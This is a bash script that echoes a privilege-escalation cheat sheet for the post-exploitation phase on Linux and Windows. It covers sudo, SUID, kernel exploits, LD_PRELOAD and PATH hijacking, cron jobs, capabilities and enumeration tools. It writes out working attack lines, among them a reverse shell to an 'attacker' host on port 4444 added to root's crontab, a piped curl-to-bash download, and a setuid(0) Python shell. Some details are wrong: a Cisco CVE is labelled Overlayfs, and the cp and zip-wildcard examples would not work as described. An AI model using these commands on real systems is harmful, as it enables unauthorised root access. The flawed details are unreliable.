#!/bin/bash

################################################################################
# PRIVILEGE ESCALATION TECHNIQUES
# Methods to escalate from user to admin/root
# POST-EXPLOITATION PHASE
################################################################################

echo "========================================"
echo "PRIVILEGE ESCALATION TECHNIQUES"
echo "========================================"
echo ""

# ============================================================================
# RECONNAISSANCE FOR PRIV-ESC
# ============================================================================

echo "[*] INFORMATION GATHERING FOR PRIV-ESC"
echo "---"

echo "1. System information:"
echo "   uname -a"
echo "   cat /etc/os-release"
echo "   uname -r  # Kernel version (look for exploits)"
echo ""

echo "2. Check current user permissions:"
echo "   id"
echo "   groups"
echo "   whoami"
echo ""

echo "3. Sudo privileges:"
echo "   sudo -l  # What can current user run as sudo?"
echo "   sudo -l -U user  # Check specific user"
echo ""

echo "4. Find SUID binaries:"
echo "   find / -perm -4000 2>/dev/null  # SUID binaries"
echo "   find / -perm -2000 2>/dev/null  # SGID binaries"
echo ""

echo "5. Check for world-writable files:"
echo "   find / -perm -002 -type f 2>/dev/null"
echo "   find / -perm -222 -type d 2>/dev/null"
echo ""

echo "6. Installed software:"
echo "   dpkg -l | grep -i 'version'"
echo "   rpm -qa"
echo ""

# ============================================================================
# SUDO EXPLOITATION
# ============================================================================

echo "[*] SUDO-BASED PRIVILEGE ESCALATION"
echo "---"

echo "1. NOPASSWD sudo:"
echo "   # If you can run commands without password"
echo "   sudo -l"
echo "   # If output shows NOPASSWD commands, run them:"
echo "   sudo /bin/bash"
echo ""

echo "2. Sudo with wildcards:"
echo "   # If sudo allows: /usr/bin/program *"
echo "   sudo /usr/bin/program /etc/shadow"
echo ""

echo "3. Command substitution in sudo:"
echo "   # If: sudo vim /etc/passwd"
echo "   # Inside vim: :!/bin/bash"
echo ""

echo "4. LD_PRELOAD:"
echo "   # If sudo preserves environment"
echo "   sudo LD_PRELOAD=/tmp/evil.so /usr/bin/program"
echo ""

echo "5. PATH manipulation:"
echo "   # If sudoers doesn't specify full path"
echo "   echo '/bin/bash' > /tmp/sudo"
echo "   export PATH=/tmp:\$PATH"
echo "   sudo sudo  # Runs our /tmp/sudo"
echo ""

# ============================================================================
# SUID BINARY EXPLOITATION
# ============================================================================

echo "[*] SUID BINARY EXPLOITATION"
echo "---"

echo "1. Find exploitable SUID binaries:"
echo "   find / -perm -4000 2>/dev/null"
echo ""

echo "2. Common vulnerable SUID binaries:"
echo "   - /usr/bin/passwd (old versions)"
echo "   - /usr/bin/sudo (old versions)"
echo "   - /bin/cp (if world-writable location)"
echo "   - Custom applications"
echo ""

echo "3. Check if binary is vulnerable:"
echo "   strings /usr/bin/suid_binary | grep -i 'system\|exec\|sh'"
echo "   ltrace /usr/bin/suid_binary"
echo ""

echo "4. Exploit example (cp command):"
echo "   # If cp is SUID and writable location exists"
echo "   cp /bin/bash /tmp/bash_copy"
echo "   chmod u+s /tmp/bash_copy"
echo "   /tmp/bash_copy -p  # Run with elevated privs"
echo ""

# ============================================================================
# KERNEL EXPLOITS
# ============================================================================

echo "[*] KERNEL VULNERABILITY EXPLOITATION"
echo "---"

echo "1. Check kernel version for known CVEs:"
echo "   uname -r"
echo "   # Search CVE database for kernel version"
echo "   https://www.cvedetails.com/"
echo ""

echo "2. Find kernel exploits:"
echo "   searchsploit 'Linux Kernel' 5.10"
echo ""

echo "3. Common kernel exploits:"
echo "   - Dirty COW (CVE-2016-5195)"
echo "   - PwnKit (CVE-2021-4034)"
echo "   - Overlayfs (CVE-2023-20198)"
echo ""

echo "4. Compile and run exploit:"
echo "   gcc -o exploit exploit.c"
echo "   ./exploit"
echo ""

# ============================================================================
# ENVIRONMENT VARIABLE HIJACKING
# ============================================================================

echo "[*] ENVIRONMENT VARIABLE EXPLOITATION"
echo "---"

echo "1. LD_PRELOAD injection:"
echo "   # Create malicious library"
echo "   gcc -shared -fPIC evil.c -o evil.so"
echo "   # If sudo preserves LD_PRELOAD"
echo "   sudo LD_PRELOAD=./evil.so /usr/bin/program"
echo ""

echo "2. LD_LIBRARY_PATH hijacking:"
echo "   export LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH"
echo "   # Place fake library in /tmp"
echo ""

echo "3. PATH variable manipulation:"
echo "   # If program runs without full path"
echo "   export PATH=/tmp:$PATH"
echo "   # Place fake binary in /tmp"
echo ""

# ============================================================================
# CRON JOB EXPLOITATION
# ============================================================================

echo "[*] CRON JOB PRIVILEGE ESCALATION"
echo "---"

echo "1. Find cron jobs:"
echo "   crontab -l  # Current user"
echo "   sudo crontab -l  # Root cron jobs"
echo "   cat /etc/crontab"
echo "   ls -la /etc/cron.d/"
echo ""

echo "2. Writable cron script:"
echo "   # If cron runs a script you can write"
echo "   echo '/bin/bash -i >& /dev/tcp/attacker/4444 0>&1' >> /var/spool/cron/crontabs/root"
echo ""

echo "3. Wildcard injection:"
echo "   # If cron runs: /usr/bin/zip -r backup *.sql"
echo "   # In that directory, create:"
echo "   touch -- '-e sh shell.c'"
echo "   # Will execute shell.c"
echo ""

# ============================================================================
# CAPABILITIES EXPLOITATION
# ============================================================================

echo "[*] LINUX CAPABILITIES ESCALATION"
echo "---"

echo "1. Find files with capabilities:"
echo "   getcap -r / 2>/dev/null"
echo ""

echo "2. Common dangerous capabilities:"
echo "   - cap_setuid (can change UID)"
echo "   - cap_setgid (can change GID)"
echo "   - cap_sys_admin (near-root privileges)"
echo ""

echo "3. Exploit example:"
echo "   # If python has cap_setuid"
echo "   /usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
echo ""

# ============================================================================
# WINDOWS PRIVILEGE ESCALATION
# ============================================================================

echo "[*] WINDOWS PRIVILEGE ESCALATION"
echo "---"

echo "1. Check current user & groups:"
echo "   whoami"
echo "   whoami /groups"
echo "   net user"
echo ""

echo "2. Find unquoted service paths:"
echo "   wmic service list brief | findstr /V 'Path'"
echo "   Get-WmiObject win32_service | where-object {$_.PathName -notlike \"*\\\"*\"} | select Name,PathName"
echo ""

echo "3. Kernel exploit:"
echo "   # Upload compiled exploit"
echo "   exploit.exe"
echo ""

echo "4. Token impersonation (with Metasploit):"
echo "   use exploit/windows/local/token_impersonation"
echo ""

# ============================================================================
# AUTOMATED ENUMERATION TOOLS
# ============================================================================

echo "[*] AUTOMATED PRIVILEGE ESCALATION TOOLS"
echo "---"

echo "1. LinPEAS (Linux):"
echo "   # Download and run"
echo "   curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash"
echo ""

echo "2. WinPEAS (Windows):"
echo "   # Download and run"
echo "   https://github.com/carlospolop/PEASS-ng/releases/"
echo ""

echo "3. GTFOBins (technique reference):"
echo "   # Check if common binaries can escalate"
echo "   https://gtfobins.github.io/"
echo ""

echo "4. LOLBAS (Windows technique reference):"
echo "   https://lolbas-project.github.io/"
echo ""

echo "========================================"
echo "Always document what you find!"
echo "========================================"
